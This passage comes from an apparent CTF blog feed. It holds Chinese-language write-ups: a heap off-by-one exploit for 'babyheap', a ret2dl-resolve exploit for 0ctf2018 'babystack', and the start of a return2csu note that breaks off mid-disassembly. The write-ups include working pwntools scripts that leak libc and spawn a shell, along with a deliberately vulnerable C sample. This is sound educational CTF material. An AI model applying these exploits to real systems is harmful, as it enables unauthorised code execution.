class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># libc = ELF('./libc.so.6')</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">p = process(<span class="string">'./babyheap'</span>)   </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:   </span><br><span class="line">p = remote(sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">alloc</span><span class="params">(size,nowait=False)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> nowait:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">res = p.recvuntil(<span class="string">'Allocated\n'</span>)</span><br><span class="line"><span class="comment"># print "alloc chunk:"</span></span><br><span class="line"><span class="comment"># print int(res.split()[1])</span></span><br><span class="line"><span class="keyword">return</span> int(res.split()[<span class="number">1</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">update</span><span class="params">(idx,content,size=<span class="number">0</span>)</span>:</span></span><br><span class="line">size = size <span class="keyword">if</span> size <span class="keyword">else</span> len(content)</span><br><span class="line">content = content.ljust(size,<span class="string">"\x00"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line"><span class="comment"># print "update chunk:"</span></span><br><span class="line"><span class="comment"># print str(idx)</span></span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line"><span class="comment"># print "delete chunk"</span></span><br><span class="line"><span class="comment"># print str(idx)</span></span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line"><span class="comment"># print "view chunk"</span></span><br><span class="line"><span class="comment"># print str(idx)</span></span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">']: '</span>)</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(<span class="string">'1. Allocate'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span> </span><br><span class="line"><span class="comment"># create(0x18)</span></span><br><span class="line"><span class="comment"># create(0x10)</span></span><br><span class="line"><span class="comment"># create(0x10)</span></span><br><span class="line"><span class="comment"># update(0,25,'A'*24+'\x41')</span></span><br><span class="line"><span class="comment"># # gdb.attach(p)</span></span><br><span class="line"><span class="comment"># delete(2)</span></span><br><span class="line"><span class="comment"># # delete(0)</span></span><br><span class="line"><span class="comment"># delete(1)</span></span><br><span class="line"><span class="comment"># create(0x30)</span></span><br><span class="line"><span class="comment"># update(1,0x30,'A'*16+p64(0)+p64(0x21)+'\x00'*16)</span></span><br><span class="line"><span class="comment"># create(0x10)</span></span><br><span class="line"><span class="comment"># # create(0x10)</span></span><br><span class="line"><span class="comment"># delete(0)</span></span><br><span class="line"><span class="comment"># delete(2)</span></span><br><span class="line"><span class="comment"># view(1)</span></span><br><span class="line"><span class="comment"># p.recvuntil(']: ')</span></span><br><span class="line"><span class="comment"># res = p.recv(48)[32:40]</span></span><br><span class="line"><span class="comment"># heap_base = u64(res)</span></span><br><span class="line">meh  = alloc(<span class="number">0x10</span>)</span><br><span class="line">ovf  = alloc(<span class="number">0x28</span>)</span><br><span class="line">vic  = alloc(<span class="number">0x20</span>)</span><br><span class="line">fake = alloc(<span class="number">0x20</span>)</span><br><span class="line">alloc(<span class="number">0x20</span>)</span><br><span class="line">update(ovf,<span class="string">'a'</span>*<span class="number">0x28</span> + chr(<span class="number">0x51</span>))</span><br><span class="line">update(fake,p64(<span class="number">-1</span>,sign=<span class="string">'signed'</span>)+p64(<span class="number">-1</span>,sign=<span class="string">'signed'</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">delete(vic)</span><br><span class="line">bigass = alloc(<span class="number">0x40</span>)</span><br><span class="line">update(bigass,<span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">delete(meh)</span><br><span class="line">delete(fake)</span><br><span class="line">heap = u64(view(bigass)[<span class="number">0x30</span>:][:<span class="number">8</span>])</span><br><span class="line">log.info(<span class="string">'[*]heap address:'</span>+hex(heap))</span><br><span class="line">fake = alloc(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">update(bigass,<span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)+p64(<span class="number">0xd1</span>))  <span class="comment">#change fake size to 0xd1</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">88</span>,nowait=<span class="keyword">True</span>)</span><br><span class="line">xx = alloc(<span class="number">88</span>)</span><br><span class="line">update(xx,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))  </span><br><span class="line"></span><br><span class="line">delete(fake)   <span class="comment"># free small chunk,add to unsort bins,  fd bk point to  unsort bins addr.</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(view(bigass)[<span class="number">0x30</span>:][:<span class="number">8</span>]) - <span class="number">88</span>     <span class="comment">#compute main_arena addr</span></span><br><span class="line">log.info(<span class="string">'[*]main_arena address:'</span>+hex(main_arena))</span><br><span class="line">libc = main_arena <span class="number">-0x399b00</span></span><br><span class="line">log.info(<span class="string">'[*]libc address:'</span>+hex(libc))</span><br><span class="line">alloc(<span class="number">0x10</span>,nowait=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_chunk2 = main_arena - <span class="number">0x33</span></span><br><span class="line">fake_chunk  = main_arena + <span class="number">32</span> + <span class="number">5</span> </span><br><span class="line">fake = alloc(<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line">xx = alloc(<span class="number">0x58</span>)</span><br><span class="line"></span><br><span class="line">delete(xx)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">raw_input(<span class="string">'x'</span>)</span><br><span class="line">delete(fake)</span><br><span class="line">raw_input(<span class="string">'x'</span>)</span><br><span class="line">update(bigass,<span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(fake_chunk))</span><br><span class="line"><span class="keyword">print</span> hex(fake_chunk),hex(fake_chunk2)</span><br><span class="line">raw_input(<span class="string">'x'</span>)</span><br><span class="line">alloc(<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line">arena = alloc(<span class="number">0x48</span>)</span><br><span class="line"><span class="keyword">print</span> arena</span><br><span class="line">update(arena,<span class="string">"\x00"</span>*<span class="number">3</span> + <span class="string">"\x00"</span>*<span class="number">32</span> + p64(fake_chunk2))</span><br><span class="line">winit = alloc(<span class="number">0x48</span>)</span><br><span class="line">update(winit,<span class="string">"\x00"</span>*<span class="number">3</span> + <span class="string">"\x00"</span>*<span class="number">16</span> + p64(libc + <span class="number">0x3f35a</span>))</span><br><span class="line">raw_input(<span class="string">'x'</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>,nowait=<span class="keyword">True</span>)</span><br><span class="line">    </span><br><span class="line">log.info(<span class="string">'[*]get shell!!!'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-150522.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;赛题链接&quot;&gt;&lt;a href=&quot;#赛题链接&quot; class=&quot;headerlink&quot; title=&quot;赛题链接&quot;&gt;&lt;/a&gt;赛题链接&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/eternalsakura/ctf_pwn/blob/master/
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="堆利用" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    
      <category term="overlap" scheme="http://eternalsakura13.com/tags/overlap/"/>
    
      <category term="off-by-one" scheme="http://eternalsakura13.com/tags/off-by-one/"/>
    
  </entry>
  
  <entry>
    <title>0ctf2018 babystack writeup</title>
    <link href="http://eternalsakura13.com/2018/04/01/babystack/"/>
    <id>http://eternalsakura13.com/2018/04/01/babystack/</id>
    <published>2018-04-01T06:17:53.791Z</published>
    <updated>2018-04-02T18:51:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/0ctf2018/babystack" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/0ctf2018/babystack</a></p><h2 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h2><h3 id="ret2dl-in-x86"><a href="#ret2dl-in-x86" class="headerlink" title="ret2dl in x86"></a>ret2dl in x86</h3><p>没有能用来leak的漏洞。<br>如下面的代码,除了明显的栈溢出，没有可以用来leak内存布局，bypass aslr的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void vulfunc()</span><br><span class="line">&#123;</span><br><span class="line">    char sbuf[10];</span><br><span class="line">    read(0, sbuf, 60);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    vulfunc();</span><br><span class="line">    exit(0);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>本来想写一下原理的，不过其他资料已经讲得非常好了，实在没什么可补充的（其实是我还不怎么懂）。<br><a href="https://www.slideshare.net/AngelBoy1/re2dlresolve" target="_blank" rel="noopener">https://www.slideshare.net/AngelBoy1/re2dlresolve</a><br><a href="http://www.inforsec.org/wp/wp-content/uploads/2016/01/sec15-paper-di-frederico.pdf" target="_blank" rel="noopener">http://www.inforsec.org/wp/wp-content/uploads/2016/01/sec15-paper-di-frederico.pdf</a><br><a href="http://skysider.com/?p=416" target="_blank" rel="noopener">http://skysider.com/?p=416</a><br>学习过程中最好找个程序，然后对着_dl_runtime_resolve源码服用，效果更佳，然后再看图就思路清晰了。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>alarm用keypatch先nop掉<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-01-092544.png" alt=""><br>可以看出有很明显的栈溢出漏洞，但是只有一个read，没有可以用来leak的函数，所以用ret2dl的解法<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-01-092629.png" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol><li>通过栈溢出来调用read函数在bss段写我们需要的结构和/bin/sh</li><li>然后使用dl_resolve_call去调用system，得到shell。</li></ol><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> roputils</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">readplt = <span class="number">0x08048300</span></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">vulFunc = <span class="number">0x0804843B</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./babystack'</span>)</span><br><span class="line"><span class="comment"># p = remote('202.120.7.202', 6666)</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getReloc</span><span class="params">(elf, base)</span>:</span></span><br><span class="line">    jmprel = elf.dynamic(<span class="string">'JMPREL'</span>)</span><br><span class="line">    relent = elf.dynamic(<span class="string">'RELENT'</span>)</span><br><span class="line"></span><br><span class="line">    addr_reloc, padlen_reloc = elf.align(base, jmprel, relent)</span><br><span class="line">    reloc_offset = addr_reloc - jmprel</span><br><span class="line">    <span class="keyword">return</span> reloc_offset</span><br><span class="line"></span><br><span class="line">rop = roputils.ROP(<span class="string">'./babystack'</span>)</span><br><span class="line">addr_bss = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step1 : write sh &amp; resolve struct to bss</span></span><br><span class="line">buf1 = <span class="string">'A'</span> * offset <span class="comment">#44</span></span><br><span class="line">buf1 += p32(readplt) + p32(vulFunc) + p32(<span class="number">0</span>) + p32(addr_bss) + p32(<span class="number">100</span>)</span><br><span class="line">p.send(buf1)</span><br><span class="line"></span><br><span class="line">buf2 =  rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf2 += rop.fill(<span class="number">20</span>, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss+<span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf2 += rop.fill(<span class="number">100</span>, buf2)</span><br><span class="line">p.send(buf2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step2 : use dl_resolve_call get system &amp; system('/bin/sh')</span></span><br><span class="line">buf3 = <span class="string">'A'</span>*<span class="number">44</span> + rop.dl_resolve_call(addr_bss+<span class="number">20</span>, addr_bss)</span><br><span class="line">p.send(buf3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-01-091535.png" alt=""></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>ret2dl方法是hook师傅教我的，我也没全看懂，只是理解了基本思路后，整个过程用roputils工具来实现的,工具我放在了我的<a href="https://github.com/eternalsakura/ctf_pwn/blob/master/roputils.py" target="_blank" rel="noopener">github</a>上。<br>依然不懂怎么手工构造，而且程序再换成64位也就不会，还要学习一下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;赛题链接&quot;&gt;&lt;a href=&quot;#赛题链接&quot; class=&quot;headerlink&quot; title=&quot;赛题链接&quot;&gt;&lt;/a&gt;赛题链接&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/eternalsakura/ctf_pwn/tree/master/
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="栈溢出" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    
      <category term="ret2dl" scheme="http://eternalsakura13.com/tags/ret2dl/"/>
    
  </entry>
  
  <entry>
    <title>return2csu学习笔记</title>
    <link href="http://eternalsakura13.com/2018/03/31/return2csu/"/>
    <id>http://eternalsakura13.com/2018/03/31/return2csu/</id>
    <published>2018-03-31T08:28:59.847Z</published>
    <updated>2018-03-31T12:56:41.694Z</updated>
    
    <content type="html"><![CDATA[<h2 id="议题下载链接"><a href="#议题下载链接" class="headerlink" title="议题下载链接"></a>议题下载链接</h2><p><a href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR.pdf</a><br><a href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf</a></p><h3 id="ASLR简述"><a href="#ASLR简述" class="headerlink" title="ASLR简述"></a>ASLR简述</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-084818.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-084852.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-090234.png" alt=""></p><p>由于程序的堆、栈分配与共享库的装载都是在运行时进行, 系统在程序每次执行时, <strong>随机地分配程序堆栈的地址以及共享库装载的地址</strong>。尽管它们之间的相对位置没有改变, 但每次执行的差异仍然是页级的, 攻击者将无法预测自己写入的数据区的确切虚拟地址。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-090311.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-090517.png" alt=""></p><h3 id="The-Attached-code"><a href="#The-Attached-code" class="headerlink" title="The Attached code"></a>The Attached code</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-091057.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-090925.png" alt=""><br>我只写了一个main函数，那其他的函数是怎么来的呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/ctf/0ctf2018/blackhole$ objdump -d empty</span><br><span class="line"></span><br><span class="line">empty：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .init:</span><br><span class="line"></span><br><span class="line">0000000000400390 &lt;_init&gt;:</span><br><span class="line">  400390:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  400394:48 8b 05 5d 0c 20 00 mov    0x200c5d(%rip),%rax        # 600ff8 &lt;_DYNAMIC+0x1d0&gt;</span><br><span class="line">  40039b:48 85 c0             test   %rax,%rax</span><br><span class="line">  40039e:74 05                je     4003a5 &lt;_init+0x15&gt;</span><br><span class="line">  4003a0:e8 2b 00 00 00       callq  4003d0 &lt;__libc_start_main@plt+0x10&gt;</span><br><span class="line">  4003a5:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  4003a9:c3                   retq   </span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">00000000004003b0 &lt;__libc_start_main@plt-0x10&gt;:</span><br><span class="line">  4003b0:ff 35 52 0c 20 00    pushq  0x200c52(%rip)        # 601008 &lt;_GLOBAL_OFFSET_TABLE_+0x8&gt;</span><br><span class="line">  4003b6:ff 25 54 0c 20 00    jmpq   *0x200c54(%rip)        # 601010 &lt;_GLOBAL_OFFSET_TABLE_+0x10&gt;</span><br><span class="line">  4003bc:0f 1f 40 00          nopl   0x0(%rax)</span><br><span class="line"></span><br><span class="line">00000000004003c0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line">  4003c0:ff 25 52 0c 20 00    jmpq   *0x200c52(%rip)        # 601018 &lt;_GLOBAL_OFFSET_TABLE_+0x18&gt;</span><br><span class="line">  4003c6:68 00 00 00 00       pushq  $0x0</span><br><span class="line">  4003cb:e9 e0 ff ff ff       jmpq   4003b0 &lt;_init+0x20&gt;</span><br><span class="line"></span><br><span class="line">Disassembly of section .plt.got:</span><br><span class="line"></span><br><span class="line">00000000004003d0 &lt;.plt.got&gt;:</span><br><span class="line">  4003d0:ff 25 22 0c 20 00    jmpq   *0x200c22(%rip)        # 600ff8 &lt;_DYNAMIC+0x1d0&gt;</span><br><span class="line">  4003d6:66 90                xchg   %ax,%ax</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000004003e0 &lt;_start&gt;:</span><br><span class="line">  4003e0:31 ed                xor    %ebp,%ebp</span><br><span class="line">  4003e2:49 89 d1             mov    %rdx,%r9</span><br><span class="line">  4003e5:5e                   pop    %rsi</span><br><span class="line">  4003e6:48 89 e2             mov    %rsp,%rdx</span><br><span class="line">  4003e9:48 83 e4 f0          and    $0xfffffffffffffff0,%rsp</span><br><span class="line">  4003ed:50                   push   %rax</span><br><span class="line">  4003ee:54                   push   %rsp</span><br><span class="line">  4003ef:49 c7 c0 60 05 40 00 mov    $0x400560,%r8</span><br><span class="line">  4003f6:48 c7 c1 f0 04 40 00 mov    $0x4004f0,%rcx</span><br><span class="line">  4003fd:48 c7 c7 d6 04 40 00 mov    $0x4004d6,%rdi</span><br><span class="line">  400404:e8 b7 ff ff ff       callq  4003c0 &lt;__libc_start_main@plt&gt;</span><br><span class="line">  400409:f4                   hlt    </span><br><span class="line">  40040a:66 0f 1f 44 00 00    nopw   0x0(%rax,%rax,1)</span><br><span class="line"></span><br><span class="line">0000000000400410 &lt;deregister_tm_clones&gt;:</span><br><span class="line">  400410:b8 37 10 60 00       mov    $0x601037,%eax</span><br><span class="line">  400415:55                   push   %rbp</span><br><span class="line">  400416:48 2d 30 10 60 00    sub    $0x601030,%rax</span><br><span class="line">  40041c:48 83 f8 0e          cmp    $0xe,%rax</span><br><span class="line">  400420:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  400423:76 1b                jbe    400440 &lt;deregister_tm_clones+0x30&gt;</span><br><span class="line">  400425:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  40042a:48 85 c0             test   %rax,%rax</span><br><span class="line">  40042d:74 11                je     400440 &lt;deregister_tm_clones+0x30&gt;</span><br><span class="line">  40042f:5d                   pop    %rbp</span><br><span class="line">  400430:bf 30 10 60 00       mov    $0x601030,%edi</span><br><span class="line">  400435:ff e0                jmpq   *%rax</span><br><span class="line">  400437:66 0f 1f 84 00 00 00 nopw   0x0(%rax,%rax,1)</span><br><span class="line">  40043e:00 00 </span><br><span class="line">  400440:5d                   pop    %rbp</span><br><span class="line">  400441:c3                   retq   </span><br><span class="line">  400442:0f 1f 40 00          nopl   0x0(%rax)</span><br><span class="line">  400446:66 2e 0f 1f 84 00 00 nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  40044d:00 00 00 </span><br><span class="line"></span><br><span class="line">0000000000400450 &lt;register_tm_clones&gt;:</span><br><span class="line">  400450:be 30 10 60 00       mov    $0x601030,%esi</span><br><span class="line">  400455:55                   push   %rbp</span><br><span class="line">  400456:48 81 ee 30 10 60 00 sub    $0x601030,%rsi</span><br><span class="line">  40045d:48 c1 fe 03          sar    $0x3,%rsi</span><br><span class="line">  400461:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  400464:48 89 f0             mov    %rsi,%rax</span><br><span class="line">  400467:48 c1 e8 3f          shr    $0x3f,%rax</span><br><span class="line">  40046b:48 01 c6             add    %rax,%rsi</span><br><span class="line">  40046e:48 d1 fe             sar    %rsi</span><br><span class="line">  400471:74 15                je     400488 